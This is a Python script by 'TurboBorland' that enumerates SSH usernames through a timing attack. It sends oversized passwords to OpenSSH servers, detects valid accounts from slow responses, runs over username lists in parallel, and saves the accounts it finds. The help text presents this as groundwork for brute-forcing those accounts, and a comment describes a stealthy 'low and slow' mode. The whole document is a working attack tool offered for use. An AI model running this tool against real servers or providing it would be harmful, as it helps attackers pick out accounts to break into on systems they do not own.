# SSH time cheeck bruteforce - TurboBorland
# Ridiculously enhanced and analyzed after shitty post by:
# http://cureblog.de/openssh-user-enumeration-time-based-attack/
try:	import paramiko
except:	print("Paramiko not installed. Fuck handling my own socket for this type of stuff. https://github.com/hallmark/sublime-p4miko/wiki/Installing-paramiko-Python-package")
import itertools
from sys import argv
from time import time,sleep
from random import randint
from multiprocessing import Pool, Lock, active_children

def help_out(option):
	print(option)
	print("\nDescription of attack:")
	print("\nThis tests for valid usernames on SSH servers without knowing passwords. This allows validation of usernames before attempting to attack/bruteforce the account. This was ridiculously modified and heavily analyzed after reading the shitty advisory/PoC:\nhttp://cureblog.de/openssh-user-enumeration-time-based-attack/\nThis DOES NOT work with all OpenSSH 6.x and 5.x as described by the post. As this is timing, use with a grain of salt that this may not always work. This has, however, been tested to work legitimately.\nThere are other features hidden in the script under comments (#). Have fun - TurboBorland\n")
	print("Generic Options:")
	print("\t-host\tSet host name/ip")
	print("\t-port\tSet port number (default 22)")
	print("\t-user\tSet singular username value")
	print("\t-userf\tSet readable file of newline seperated usernames")
	print("\t-valid\tSet writeable file for newline seperated valid usernames (default \"validnames\")")
	
	print("Extra Options:")
	# why would we do this when we can cat /etc/passwd?
	# well...to see if users have remote ssh capabilities
	# YOu may say, well check which ones have valid shells
	# well, that's not always possible and fuck you for asking :)
	print("\t-local\tIf PAM is set to off, local works (read comments if you want to know why this is even an option)")
	print("\t-procs\tSet amount of procs for large lists (default 1)")
	exit() 

global lock # lock screen and file write
lock = Lock()
valid     = "validnames" # file to write discovered usernames, set with -valid
pool_size = 1 # 1 for linear discovery, set -procs for more
chunksize = 5 # chunk off usernames for each process
x      = 0  # argv offset counter
port   = 22 # default ssh port
f      = '' # do we have a file?
local  = 0  # for some reason someone wants to test ssh-capable users on local box
if (len(argv) < 2):	help_out("Not enough options set")
for arg in argv:
	if(arg == "-host"):
		try:	host = str(argv[x+1])
		except:	help_out("Host not set to string")
	if(arg == "-port"):
		try:	port = int(argv[x+1])
		except:	help_out("Port not set to integer")
	if(arg == "-user"):
		try:	user = str(argv[x+1])
		except:	help_out("User not set to string. Did you mean -userf?")
	if(arg == "-userf"):
		try:	f = open(argv[x+1],"r").readlines()
		except e:	help_out("Error with reading given file %s" % e)
	if(arg == "-local"):	local = 1
	if(arg == "-procs"):
		try:	pool_size = int(argv[x+1])
		except:	help_out("Error when setting integer value for -procs")
	if(arg == "-valid"):
		try:
			valid = str(argv[x+1])
			success = open(argv[x+1],"w")
			success.close()
		except:	help_out("Error with attempting to open file for writing %s" % e)
	if(arg == "-h"):
		help_out("Help Menu Options:")
	x += 1

# threading because we shouldn't be slamming the poor box with real parallel work here
# slam it with bruteforce if you want to do that
class check_it(object):
	def __init__(self,user):
		self.user = user

	def run(self):
		lock.acquire()
		# comment me out for less noise
		print("Connecting %s@%s:%d " % (self.user,host,int(port)))
		lock.release()
		self.para = paramiko.Transport((host,port))
		self.para.local_version="SSH-2.0-TurboBorland"
	
		try:	self.para.connect(username=self.user)
		except EOFError,self.e:
			lock.acquire()
			print("Error: %s" % self.e)
			lock.release()
			return -1
		except paramiko.SSHException,self.e:
			lock.acquire()
			print("Error: %s" % self.e)
			lock.release()
			return -2

		# long password makes extended wait period
		# it's not freezing, it's just taking forever. 120 seconds happens
		passwd = "A"*39000
		self.timeStart = int(time())

		# the passes might not allow certain issues to be raised for you
		try:	self.para.auth_password(self.user,passwd)
		except paramiko.AuthenticationException:	pass
		except paramiko.SSHException:	pass

		self.timeDone = int(time())
		self.timeRes = self.timeDone-self.timeStart
		# in case your testing times yourself, uncomment this
		#print("Time until response: %s" % str(timeRes))
	
		# invalid is 0-1 seconds, valid is about 5-6. Again with PAM off
		if(self.timeRes >= 4 and local == 1):
			lock.acquire()
			print("User: %s exists" % self.user)
			self.success = open(valid,"a")
                        self.success.write("%s\n" % self.user)
                        self.success.close()
			lock.release()
		# invalid is around 2-6, valid is way past 20
		elif(self.timeRes > 20):
			lock.acquire()
			print("User: %s exists" % self.user)
			if(success != ''):
				try:
					self.success = open(valid,"a")
					self.success.write("%s\n" % self.user)
					self.success.close()
				except IOError,e:	print(e)
			else:	print("User: %s not found" % self.user)
			lock.release()
		self.para.close()
		return 1

# group our usernames to distribute between processes
def grouper(iterable,n,fillvalue=None):
    it = iter(iterable)
    def take():
        while 1: yield list(itertools.islice(it,n))
    return iter(take().next,[])

# do work, son!
def worker(chunk):
	for username in chunk:
		username = username.strip("\n")
		while(check_it(username).run() != 1):	sleep(1)	
		#sleep(randint(10,30)) # enable to random sleep between attempts. Good for low and slow with default 1 proc

# one user given
if(f == ''):
	while(check_it(user) != 1):	sleep(1)
	exit()

# user file given
if (len(f) < chunksize):    chunksize = len(f)
pool = Pool(processes=pool_size)
for chunk in itertools.izip(grouper(f,chunksize)):  pool.map_async(worker,chunk)
pool.close()
try:
	while(len(active_children()) > 0): # how many active children do we have
        	sleep(2)
                ignore = active_children()
except KeyboardInterrupt:       exit('CTRL^C caught, exiting...\n\n')
